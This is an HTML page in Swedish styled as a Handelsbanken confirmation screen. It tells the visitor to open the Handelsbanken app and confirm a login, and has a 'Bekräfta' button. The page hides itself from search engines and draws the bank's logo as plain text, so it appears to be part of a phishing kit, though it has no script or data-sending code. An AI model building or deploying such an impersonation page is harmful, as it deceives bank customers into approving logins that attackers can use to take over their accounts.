<!DOCTYPE html>
<html lang="sv"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Bekräftelse - Handelsbanken</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
        }
        .container-wrapper {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            background: #005fa5;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .logo {
            width: 200px;
            height: auto;
            margin: 0 auto 10px;
            display: block;
        }
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .content {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 8px;
            padding: 40px;
            text-align: center;
        }
        .icon-circle {
            width: 120px;
            height: 120px;
            background: #e5f2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }
        p {
            font-size: 16px;
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        .button {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            background: #005fa5;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .button:hover {
            background: #004a85;
        }
    </style>
</head>
<body>
    <div class="container-wrapper">
        <header>
            <div class="logo">
                <svg viewBox="0 0 200 40" style="width: 200px; height: 40px;" fill="white">
                    <text x="10" y="25" font-size="20" font-weight="bold">Handelsbanken</text>
                </svg>
            </div>
            <div style="font-size: 14px; margin-top: 10px;">Bekräftelse</div>
        </header>
        <main>
            <div class="content">
                <div class="icon-circle">
                    <svg viewBox="0 0 64 64" style="width: 64px; height: 64px;" fill="#005fa5">
                        <path d="M32,4C16.536,4,4,16.536,4,32s12.536,28,28,28s28-12.536,28-28S47.464,4,32,4z M32,56 C18.641,56,8,45.359,8,32S18.641,8,32,8s24,10.641,24,24S45.359,56,32,56z"></path>
                        <path d="M28,32l6,6l12-12"></path>
                    </svg>
                </div>
                <h1>Bekräfta i Handelsbanken-appen</h1>
                <p>Öppna Handelsbanken-appen</p>
                <p style="font-size: 14px;">Bekräfta inloggningen i Handelsbanken-appen</p>
                <button type="button" class="button" id="confirm-button">Bekräfta</button>
            </div>
        </main>
    </div>
</body>
</html>
